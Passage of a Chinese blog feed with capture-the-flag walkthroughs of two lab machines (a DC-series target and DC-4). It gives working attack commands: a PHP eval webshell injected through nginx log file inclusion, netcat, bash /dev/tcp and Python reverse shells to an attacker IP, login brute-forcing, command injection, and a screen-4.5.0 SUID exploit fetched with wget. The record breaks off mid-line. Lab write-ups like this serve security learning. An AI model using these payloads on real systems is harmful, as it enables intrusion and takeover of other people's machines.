alt="image-20240717200941862"></p><p>在错误日志中，我们可以发现，先前访问密码文件<code>/etc/shadow</code>引发的错误信息日志。可以看到，浏览器尝试打开文件<code>/etc/shadow</code>，但可能由于权限限制，文件打开失败。因此将该文件路径记录进错误日志中，记录服务器尝试打开文件但失败的信息。</p><blockquote><p>这里提供给我们一个思路：在将包含文件路径替换为一句话木马，目标服务器是否也会尝试去打开（执行）。</p></blockquote><p>至此，第三个访问配置文件就可以先不访问了。编写提权一句话木马，注入到文件包含路径处。</p><h3 id="注入一句话木马"><a href="#注入一句话木马" class="headerlink" title="注入一句话木马"></a>注入一句话木马</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash《》">&lt;?php @eval($_POST[&#x27;shell&#x27;]);?&gt;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240717194058442.png"></p><p>注意：需要将格式什么的一并写入的包含的路径处。</p><p>对错误日志文件进行文件包含并再次进行抓包-重放-查看，如下：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240717201101644.png" alt="image-20240717201101644"></p><p>可以发现，写入的一句话木马已经被成功记录在错误日志当中了。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240717193905317.png" alt="image-20240717193905317"></p><p>但是此时尝试连接的时候怎么都连接不上！！！！尝试了挺多方法的。最后通过请教糖糖，得出了结论：<code>是由于没有给注入的一句话木马加上双引号导致的写入失败</code>。</p><blockquote><p>之前在修改用户hash密码的部分也强调了需要给密码值添加双引号！，原因是让后台程序将其当作一个字符串处理而不是对其进行编码。我猜测这次的一句话木马注入同理，如果不给其添加双引号告诉后台将其当作一整个字符串处理的话，那么后台就会对其进行从左到右的识别，即编码，这可能会导致“木马不成木马”。从而致使反弹shell失败。</p></blockquote><p>所以，对一句话木马<code>添加双引号</code>后进行重新注入：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240718100954941.png" alt="image-20240718100954941"></p><p>访问错误日志，对其进行抓包并重放，查看响应日志：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240718101452541.png" alt="image-20240718101452541"></p><p>可以发现，错误日志中已经写入了一句话木马。</p><p>接下来使用中国蚁剑新建连接，尝试让对方服务器执行我们注入的一句话木马，就是执行shell捏！。</p><p>新建连接，然后写入包含错误日志的url，密码是shell，测试连接！</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240718113614750.png" alt="image-20240718113614750"></p><p>我测！还是提示”返回数据为空“！心理防线要崩溃了。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/33G0((%40QI847LS61RX4)RHY.png" alt="img"></p><p>仔细查看糖糖昨晚给我发的添加双引号后抓包得到的截图，发现我们在抓取的一句话木马注入的数据包上有些许不同。那就是，我注入的一句话木马在抓取到的数据包中，其<code>&lt;&gt;&quot;&quot;&#39;&#39;</code>都被编码了，而糖糖的并没有被编码（经过询问，可能是我使用的burpsuite版本有点低？）。</p><p>这不就是上面我所说的<code>被编码</code>问题了吗！我测！既然如此，你不仁便别怪我不义。</p><p>将抓取到的数据包发送到重放器，直接对数据包进行修改，把被编码的部分都改回来！！！然后重放该数据包，得到如下响应：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240718114303124.png" alt="image-20240718114303124"></p><p>这时候我们再对中国蚁剑进行连接测试。我测！连接成功了！</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240718113449128.png" alt="image-20240718113449128"></p><p>尝试打开虚拟终端，我测！终于成功了！</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240718114818442.png" alt="image-20240718114818442"></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240718114845899.png" alt="image-20240718114845899"></p><p>码垛，好激动！！！！！！！啊啊啊啊！！！血的记忆！！！！！</p><p>接下来就是要启动交互界面了，因为在虚拟终端中不能复制粘贴，啥命令都得自己打。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240718161048835.png" alt="image-20240718161048835"></p><h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>上面已经成功地注入一句话木马并让对方服务器执行了shell了。现在我们需要在自己的本地终端”远程登陆“对方的用户账户，然后执行更进一步的操作。</p><p>结合之前的经验，我们可以通过注入脚本代码，让对方执行，并在我们本地终端监听端口，等待反弹shell。</p><p>同样是利用文件包含漏洞来实现这个脚本注入：</p><p>我们前面已经将一句话木马<code>&lt;?php @eval($_POST[&#39;shell&#39;]);?&gt;</code>写入了错误日志文件中。</p><p>现在我们想让对方不单执行<code>shell</code>，还要赋予我们权限（攻击方）为我们开启端口监听服务。因此我们可以将注入内部的<code>shell</code>使用<code>&amp;</code>符号进行重新更新。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc -e /bin/sh 192.168.204.128 9999<br></code></pre></td></tr></table></figure><p><code>nc</code>使用nc（netcat）工具建立一个反弹shell连接</p><p><code>-e /bin/sh</code>指定连接建立后执行的程序，<code>/bin/sh</code>是指向系统默认的shell程序，用于执行命令行指令和脚本。</p><p>后面两个分别指明了攻击者的IP地址，以及攻击者设定的监听端口。</p><p>在网页连接中访问如下链接：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://192.168.204.134/thankyou.php?file=/var/log/nginx/error.log&amp;shell=nc -e /bin/sh 192.168.204.128 9999<br></code></pre></td></tr></table></figure><p>然后在中国蚁剑测试链接并打开虚拟终端。</p><p>为了防止错过端口监听，可以现在本地终端开启监听！</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc -lvvp 9999<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240718162910445.png" alt="image-20240718162910445"></p><p>在网页访问包含错误日志的新的链接，然后在中国蚁剑尝试连接，成功。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240718163019550.png" alt="image-20240718163019550"></p><p>双击点进去，看到其文件目录，发现我们已经能够访问之前没有权限访问的CSS目录了，里面是一个”system.css“文件，可以查看具体代码：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240718163405746.png" alt="image-20240718163405746"></p><p>打开虚拟终端，在其中输入我们重定义的<code>shell值</code>：<code>nc -e /bin/sh 192.168.204.128 9999</code>，回车：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240718163540220.png" alt="image-20240718163540220"></p><p>查看本地终端，发现已经连上了目标靶机：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240718163732517.png" alt="image-20240718163732517"></p><p>启动交互界面：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python -c <span class="hljs-string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240718164219986.png" alt="image-20240718164219986"></p><p>接下来就是要查找其具有SUID权限的命令，尝试进行提权。当然也可以先查找一下当前用户账户下是否存在flag文件。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find / -name *flag*<br></code></pre></td></tr></table></figure><p>但是我们发现重要文件被拒绝访问了捏！所以我们得先提权！！</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240718175801209.png" alt="image-20240718175801209"></p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><ul><li><strong>查看具有SUID权限的命令</strong></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find / -perm -u=s -<span class="hljs-built_in">type</span> f 2&gt;/dev/null<br></code></pre></td></tr></table></figure><p>得到如下结果：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240718184000866.png" alt="image-20240718184000866"></p><p>可用于提权的命令有：<code>mount</code>、<code>screen-4.5.0</code>、<code>exim4</code></p><p>根据之前的经验，可以有效进行提权的指令为<code>exim4</code>，但是相对复杂，需要逐个进行测试，唉，也不算咋复杂吧，有脚本的话会方便一点。</p><p>先从比较熟悉的命令开始尝试提权吧。</p><h3 id="mount提权"><a href="#mount提权" class="headerlink" title="mount提权"></a><strong>mount提权</strong></h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">mount --o <span class="hljs-built_in">bind</span> /bin/bash /usr/bin/mount<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240718184943024.png" alt="image-20240718184943024"></p><p>提示只有root权限用户才可以使用这个命令。</p><h3 id="exim4提权"><a href="#exim4提权" class="headerlink" title="exim4提权"></a><strong>exim4提权</strong></h3><p>查看使用版本：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">exim4 --version<br></code></pre></td></tr></table></figure><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240718185200089.png" alt="image-20240718185200089" style="zoom:150%;" /><p>版本为：<code> 4.84_2</code></p><p>使用<code>searchsploit</code>查找该exim4版本的可利用代码文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">searchsploit exim 4<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240718185651405.png" alt="image-20240718185651405"></p><p>只找到了一个4.84版本的漏洞利用文件，但是它是<code>4.84-3</code>，靶机使用的是<code>4.84_2</code>的。所以相当于，没有对于4.84_2版本的exim4漏洞利用文件。</p><p>使用exim4提权行不通咯！</p><h3 id="screen-4-5-0提权"><a href="#screen-4-5-0提权" class="headerlink" title="screen-4.5.0提权"></a><strong>screen-4.5.0提权</strong></h3><p><a href="https://beret81.gitbook.io/pte/quan-xian-ti-sheng/linux-ti-quan/suid-ti-quan/suid-ti-quan-screen4.5.0">SUID 提权– screen-4.5.0</a></p><p>同样也是先查找是否有关于其的漏洞利用文件。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">searchsploit screen 4.5.0<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240718185941675.png" alt="image-20240718185941675"></p><p>发现了一个脚本文件和一个txt文本文件。</p><blockquote><p>linux&#x2F;local&#x2F;41154.sh</p><p>linux&#x2F;local&#x2F;41152.txt</p></blockquote><p>首选，当然是利用脚本文件！</p><p><strong>先下载该脚本文件到当前目录下：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">searchsploit -m 41154.sh<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240718190652559.png" alt="image-20240718190652559"></p><p>然后，在本地终端（kali）启动apache2服务，将该脚本文件移动到<code>/var/www/html</code>文件夹下，相当于将文件放到网页上嘛。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">service apache2 start<br><span class="hljs-built_in">mv</span> 41154.sh /var/www/html<br>service apache2 status<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240718191251542.png" alt="image-20240718191251542"></p><p>然后，在目标靶机终端，进入<code>/tmp</code>目录下，使用<code>wget</code>命令下载该脚本文件。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">wget http://192.168.204.128/41154.sh<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240718191456356.png" alt="image-20240718191456356"></p><p>然后给与该脚本文件执行的权限：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">chmod</span> +x 41154.sh<br>./41154.sh<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240718191748797.png" alt="image-20240718191748797"></p><p>ok！成功提权！</p><p>接下来就是查找flag文件了！</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find / -name *flag*<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240718191857286.png" alt="image-20240718191857286"></p><p>cat该txt文件！</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240718191931227.png" alt="image-20240718191931227"></p><p>大功告成。结束。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>攻打这个靶场运用到了<code>文件包含漏洞</code>的利用知识。还有中国蚁剑对于<code>反弹shell</code>的操作手法。</p><ul><li><p>文件包含漏洞：包含手法、测试方法、利用方法（在包含处注入一句话木马等）注意！非路径的注入都必须使用双引号收敛。否则有很大的可能会包含失败。</p></li><li><p>利用到了nginx的特点：nginx会将执行的命令记录下来并写入日志文件中。本文中使用中国蚁剑对nginx的错误日志进行连接的时候，会触发其执行包含注入的php代码（譬如一句话木马等）</p></li><li><p>目录爆破跟字典有关系，有些时候没爆破出东西，可能是字典不够大，换个工具或者换个字典都行。</p></li><li><p>新学到一个screen提权。</p></li></ul>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>DC-4</title>
    <link href="/2024/07/24/DC-4/"/>
    <url>/2024/07/24/DC-4/</url>
    
    <content type="html"><![CDATA[<h1 id="DC-4"><a href="#DC-4" class="headerlink" title="DC-4"></a>DC-4</h1><h2 id="IP扫描"><a href="#IP扫描" class="headerlink" title="IP扫描"></a>IP扫描</h2><p>通过开关目标靶机来确认目标靶机的IP地址。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -sN  192.168.204.0/24<br></code></pre></td></tr></table></figure><p>开靶机前：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240704224901788.png" alt="image-20240704224901788"></p><p>开靶机后：<br><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240704224934605.png" alt="image-20240704224934605"></p><p>对比之下可以得到目标靶机的IP地址为：<code>192.168.204.133</code>。</p><h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><h3 id="扫描开放的TCP端口"><a href="#扫描开放的TCP端口" class="headerlink" title="扫描开放的TCP端口"></a>扫描开放的TCP端口</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -sN -p- 192.168.204.133<br>nmap -sT -p- 192.168.204.133<br></code></pre></td></tr></table></figure><p><code>-sN</code>：表示执行Null扫描，Null扫描是一种TCP扫描技术。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240704225650473.png" alt="image-20240704225650473"></p><p>扫描结果显示，开放的端口为<code>22</code>端口和<code>80</code>端口。</p><h3 id="扫描开放的UDP端口"><a href="#扫描开放的UDP端口" class="headerlink" title="扫描开放的UDP端口"></a>扫描开放的UDP端口</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -sU -top-ports 20 -p- 192.168.204.133<br></code></pre></td></tr></table></figure><p><code>-sU</code>：表示执行UDP扫描，UDP不建立连接，所以端口扫描和响应的处理方式不同。</p><p><code>-top-ports</code>：指定扫描的端口数量，该参数后面跟一个数字。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240704230408447.png" alt="image-20240704230408447"></p><p>根据<code>STATE</code>字段，我们发现还是有蛮多开放的UDP端口的，但是一般不对UDP端口进行测试，其优先级靠后。</p><h2 id="端口详细信息扫描（tcp）"><a href="#端口详细信息扫描（tcp）" class="headerlink" title="端口详细信息扫描（tcp）"></a>端口详细信息扫描（tcp）</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -sT -sV -sC -O -p 22,80 192.168.204.133<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240704231641121.png" alt="image-20240704231641121"></p><p>根据扫描结果，可以得知：</p><blockquote><p>22端口开放的是ssh服务，运行版本为OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)，其中还给出了ssh主机密钥。提示可以进行ssh远程连接。</p><p>80端口开放的是http服务，运行版本是nginx 1.15.10。</p></blockquote><h2 id="nmap漏扫"><a href="#nmap漏扫" class="headerlink" title="nmap漏扫"></a>nmap漏扫</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -script=vuln -p 22,80 192.168.204.133<br></code></pre></td></tr></table></figure><p>这次nmap漏扫的响应时间比较长，得到如下结果：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240705134104640.png" alt="image-20240705134104640"></p><p>根据结果可知，80端口http服务可能存在着<code>csrf（跨站请求伪造）</code>漏洞。路径为：</p><blockquote><p> <a href="http://192.168.204.133/">http://192.168.204.133:80/</a></p><p> <a href="http://192.168.204.133/login.php">http://192.168.204.133:80/login.php</a></p></blockquote><p>通过网站浏览可以发现这两个网址打开都是相同的登陆界面。为了便于后续漏洞利用，比如植入一句话木马之类的，我们后续均使用<code>http://192.168.204.133:80/login.php</code></p><h2 id="网页信息收集"><a href="#网页信息收集" class="headerlink" title="网页信息收集"></a>网页信息收集</h2><p>访问链接：<code>http://192.168.204.133:80/login.php</code></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240705134633165.png" alt="image-20240705134633165"></p><p>直接就是一个管理信息系统登陆界面。</p><p>使用Wappalyzer查看网页的技术构成：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240705134758802.png" alt="image-20240705134758802"></p><p>没有得到有关网页框架等相关信息，即，没啥有用信息。</p><p>既然是登陆界面,自然就要想方设法获取合法的管理员登陆账号。可以先做目录爆破看看能否得到一些有用的资源信息。</p><h3 id="gubuster目录爆破"><a href="#gubuster目录爆破" class="headerlink" title="gubuster目录爆破"></a>gubuster目录爆破</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">gobuster <span class="hljs-built_in">dir</span> -u http://192.168.204.133 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240705135323268.png" alt="image-20240705135323268"></p><p>似乎没有得到什么有用的信息,访问爆破得到的两个网址:</p><blockquote><p><a href="http://192.168.204.133/images/">http://192.168.204.133/images/</a></p><p><a href="http://192.168.204.133/css/">http://192.168.204.133/css/</a></p></blockquote><p>两个网页的访问响应都是<code>403 Forbidden</code></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240705135444738.png" alt="image-20240705135444738"></p><blockquote><p><code>403 Forbidden</code>:是指在尝试访问网站或特定页面时,服务器拒绝了请求。发生该问题通常是由于以下原因造成的：权限不足、IP地址限制、访问控制列表（ACL）限制、http身份验证失败、目录列表拒绝、内容过滤或防火墙规则。</p></blockquote><p>所以这次目录爆破等于无效爆破，爆破出来的目录访问是被服务器拒绝的。</p><p>目前为止,捋一下思绪。我们通过nmap漏扫发现了网站可能存在<code>csrf漏洞</code>，然后我们通过目录爆破出来的网址链接，访问均被服务器拒绝。通过Wappalyzer分析网页的技术构成，也没有得到有关于网页框架等有用的信息。</p><p>所以,接下来,我们就要以目标网站的csrf漏洞为切入点。</p><h3 id="访问存在csrf漏洞的登陆网页"><a href="#访问存在csrf漏洞的登陆网页" class="headerlink" title="访问存在csrf漏洞的登陆网页"></a>访问存在csrf漏洞的登陆网页</h3><p>使用burpsuite进行抓包检查登陆界面上用户名和密码的传输方式。</p><p>在登陆界面随机输入一些用户名和密码，然后点击“Submit”：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240705210622750.png" alt="image-20240705210622750"></p><p>查看burpsuite拦截到的数据包：<br><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240705210734505.png" alt="image-20240705210734505"></p><p>得到的信息有：</p><blockquote><p>请求方式为POST，传输方式是明文：username&#x3D;chfhj&amp;password&#x3D;hkjhk</p></blockquote><h3 id="burpsuite爆破"><a href="#burpsuite爆破" class="headerlink" title="burpsuite爆破"></a>burpsuite爆破</h3><p>已知账号密码传输的方式以及明文传输格式，因此可以通过抓包进行账号密码的爆破。仅设置<code>username</code>和<code>password</code>两个payload集合，然后通过用户名字典和密码字典进行爆破。(<a href="http://192.168.204.133/login.php">http://192.168.204.133:80/login.php</a>)</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240705212615851.png" alt="image-20240705212615851"></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240705213405067.png" alt="image-20240705213405067"></p><p>之后就是设置<code>payload</code>。注意，在前面<code>positions</code>选中了多少个爆破变量位置，后面就要设置多少个<code>payload</code>，set下的数字代表的是position 参数编号。需要按序分别选择然后导入爆破字典。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240706223514917.png" alt="image-20240706223514917"></p><p>设置完<code>payload</code>之后就可以点击右上角的<code>start attack</code>开始进行攻击。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240706222807477.png" alt="image-20240706222807477"></p><p>爆破完后（当然也可以是在爆破之前）进行过滤设置。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240706223951881.png" alt="image-20240706223951881"></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240706224012970.png" alt="image-20240706224012970"></p><p>设置只显示状态码为2xx系列成功的数据包。</p><p>爆破（花了很长时间）得到用户名和密码：</p><blockquote><p>username：admin     password：happy</p></blockquote><p>但是爆破结果不仅得到了上面的账号和密码，还有其它的爆破成功的用户名密码对：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240706223251316.png" alt="image-20240706223251316"></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240706223327065.png" alt="image-20240706223327065"></p><h2 id="Get-shell"><a href="#Get-shell" class="headerlink" title="Get shell"></a>Get shell</h2><p>使用上述爆破得到的账号密码进行登陆。登陆后的界面如下：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240706095837540.png" alt="image-20240706095837540"></p><p>点击“Command”得到如下界面：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240706095909244.png" alt="image-20240706095909244"></p><p>点击“Run”：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240706095954196.png" alt="image-20240706095954196"></p><p>有提示信息：<code>You have selected: ls -l</code>，似乎在指示，我们通过前端执行了命令<code> ls -l</code>。尝试抓包看看是否能够更改这条指令。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240706134153866.png" alt="image-20240706134153866"></p><p>可以看到的是，抓取的包以明文的形式显示出了<code>ls -l</code>指令，即<code>ls+-l</code>。尝试修改该指令并进行重放。将其修改为<code>cat index.php</code>即,<code>cat+index.php</code></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240706134704114.png" alt="image-20240706134704114"></p><p>然后进行放行! </p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240706134737052.png" alt="image-20240706134737052"></p><p>ok!成功地执行了我们修改的命令。so！我们就可以通过命令来反弹shell了。</p><h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><ul><li><p>实践gpt上面的反弹shell操作方案</p><p>首先需要现在攻击机进行端口监听：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc -nvlp 9999<br>/bin/bash -i &gt;&amp; /dev/tcp/192.168.204.128/9999 0&gt;&amp;1<br>burpsuite编码：<br>/bin/bash%20-i%20%3E%26%20/dev/tcp/192.168.204.128/9999%200%3E%261<br></code></pre></td></tr></table></figure><p>这里的IP地址是攻击机（kali）的IP地址。</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240706142153965.png" alt="image-20240706142153965"></p><p>好！失败。。。</p><ul><li>编写脚本进行命令注入，进而实现反弹shell</li></ul><p>首先编写反弹脚本：</p><p>设置监听目标IP以及监听端口。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">import socket,subprocess,os;<br>s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);<br>s.connect((&quot;<span class="hljs-number">192.168</span>.<span class="hljs-number">204.128</span>&quot;,<span class="hljs-number">9999</span>));<br>os.dup2(s.fileno(),0);<br>os.dup2(s.fileno(),1); <br>os.dup2(s.fileno(),2);<br>p=subprocess.call([<span class="hljs-string">&quot;/bin/sh&quot;</span>,<span class="hljs-string">&quot;-i&quot;</span>]);<br></code></pre></td></tr></table></figure><p>然后直接在终端命令行执行脚本代码：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 -c <span class="hljs-string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.204.128&quot;,9999));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span><br><br>python3%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%<span class="hljs-number">22192.168</span>.<span class="hljs-number">204.128</span>%<span class="hljs-number">22</span>,<span class="hljs-number">9999</span>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call([%22/bin/sh%22,%22-i%22]);%27<br><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240706151934510.png" alt="image-20240706151934510"></p><p>然后放行。反弹成功，获取目标靶机合法用户的登陆权限。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240706152723101.png" alt="image-20240706152723101"></p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>查看当前具有SUID权限的命令;</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find / -perm -u=s -<span class="hljs-built_in">type</span> f 2&gt;/dev/null<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240706155330709.png" alt="image-20240706155330709"></p><p>其中，可以尝试的提权命令有：</p><blockquote><p>passwd、exim4、mount、su</p></blockquote><p>首先先切换到对方用户登陆的模式。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python -c <span class="hljs-string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;);&quot;</span><br></code></pre></td></tr></table></figure><p>逐一尝试这些可能被提权的命令：</p><blockquote><p><code>passwd</code>：passwd root</p><p><code>mount</code>：mount –o bind &#x2F;bin&#x2F;bash 